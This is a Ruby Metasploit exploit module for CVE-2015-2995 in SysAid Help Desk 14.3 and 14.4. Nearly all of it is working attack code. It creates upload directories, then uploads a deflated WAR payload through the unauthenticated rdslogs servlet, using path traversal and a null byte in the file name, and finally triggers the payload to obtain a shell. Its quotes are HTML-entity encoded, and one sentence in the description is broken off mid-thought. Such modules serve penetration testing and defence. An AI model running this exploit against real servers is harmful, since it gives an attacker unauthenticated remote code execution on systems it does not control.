# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;zlib&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => "SysAid Help Desk &#039;rdslogs&#039; Arbitrary File Upload",
      &#039;Description&#039; => %q{
        This module exploits a file upload vulnerability in SysAid Help Desk v14.3 and v14.4.
        The vulnerability exists in the RdsLogsEntry servlet which accepts unauthenticated
        file uploads and handles zip file contents in a insecure way. Combining both weaknesses
        a remote attacker can accomplish remote code execution. Note that this will only work if the
        target is running Java 6 or 7 up to 7u25, as Java 7u40 and above introduce a protection
        against null byte injection in file names. This module has been tested successfully on version
        v14.3.12 b22 and v14.4.32 b25 in Linux. In theory this module also works on Windows, but SysAid
        from being exploited.
      },
      &#039;Author&#039;       =>
        [
          &#039;Pedro Ribeiro <pedrib[at]gmail.com>&#039;, # Vulnerability Discovery and Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2015-2995&#039; ],
          [ &#039;URL&#039;, &#039;https://raw.githubusercontent.com/pedrib/PoC/master/generic/sysaid-14.4-multiple-vulns.txt&#039; ],
          [ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2015/Jun/8&#039; ]
        ],
      &#039;DefaultOptions&#039; => { &#039;WfsDelay&#039; => 30 },
      &#039;Privileged&#039;  => false,
      &#039;Platform&#039;    => &#039;java&#039;,
      &#039;Arch&#039;        => ARCH_JAVA,
      &#039;Targets&#039;     =>
        [
          [ &#039;SysAid Help Desk v14.3 - 14.4 / Java Universal&#039;, { } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 3 2015&#039;))

    register_options(
      [
        Opt::RPORT(8080),
        OptInt.new(&#039;SLEEP&#039;,
          [true, &#039;Seconds to sleep while we wait for WAR deployment&#039;, 15]),
        OptString.new(&#039;TARGETURI&#039;,
          [true, &#039;Base path to the SysAid application&#039;, &#039;/sysaid/&#039;])
      ], self.class)
  end


  def check
    servlet_path = &#039;rdslogs&#039;
    bogus_file = rand_text_alphanumeric(4 + rand(32 - 4))

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(datastore[&#039;TARGETURI&#039;], servlet_path),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_get&#039; => {
        &#039;rdsName&#039; => bogus_file
      }
    })

    if res && res.code == 200
      return Exploit::CheckCode::Detected
    end
  end


  def exploit
    app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    tomcat_path = &#039;../../../../&#039;
    servlet_path = &#039;rdslogs&#039;

    # We need to create the upload directories before our first attempt to upload the WAR.
    print_status("#{peer} - Creating upload directory")
    bogus_file = rand_text_alphanumeric(4 + rand(32 - 4))
    send_request_cgi({
      &#039;uri&#039; => normalize_uri(datastore[&#039;TARGETURI&#039;], servlet_path),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039; => Zlib::Deflate.deflate(rand_text_alphanumeric(4 + rand(32 - 4))),
      &#039;ctype&#039; => &#039;application/xml&#039;,
      &#039;vars_get&#039; => {
        &#039;rdsName&#039; => bogus_file
      }
    })

    war_payload = payload.encoded_war({ :app_name => app_base }).to_s

    # We have to use the Zlib deflate routine as the Metasploit Zip API seems to fail
    print_status("#{peer} - Uploading WAR file...")
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(datastore[&#039;TARGETURI&#039;], servlet_path),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039; => Zlib::Deflate.deflate(war_payload),
      &#039;ctype&#039; => &#039;application/octet-stream&#039;,
      &#039;vars_get&#039; => {
        &#039;rdsName&#039; => "#{tomcat_path}/tomcat/webapps/#{app_base}.war\x00"
      }
    })

    # The server either returns a 200 OK when the upload is successful.
    if res && res.code == 200
      print_status("#{peer} - Upload appears to have been successful, waiting #{datastore[&#039;SLEEP&#039;]} seconds for deployment")
      register_files_for_cleanup("tomcat/webapps/#{app_base}.war")
    else
      fail_with(Failure::Unknown, "#{peer} - WAR upload failed")
    end

    10.times do
      select(nil, nil, nil, 2)

      # Now make a request to trigger the newly deployed war
      print_status("#{peer} - Attempting to launch payload in deployed WAR...")
      res = send_request_cgi({
        &#039;uri&#039;    => normalize_uri(app_base, Rex::Text.rand_text_alpha(rand(8)+8)),
        &#039;method&#039; => &#039;GET&#039;
      })
      # Failure. The request timed out or the server went away.
      break if res.nil?
      # Success! Triggered the payload, should have a shell incoming
      break if res.code == 200
    end
  end
end

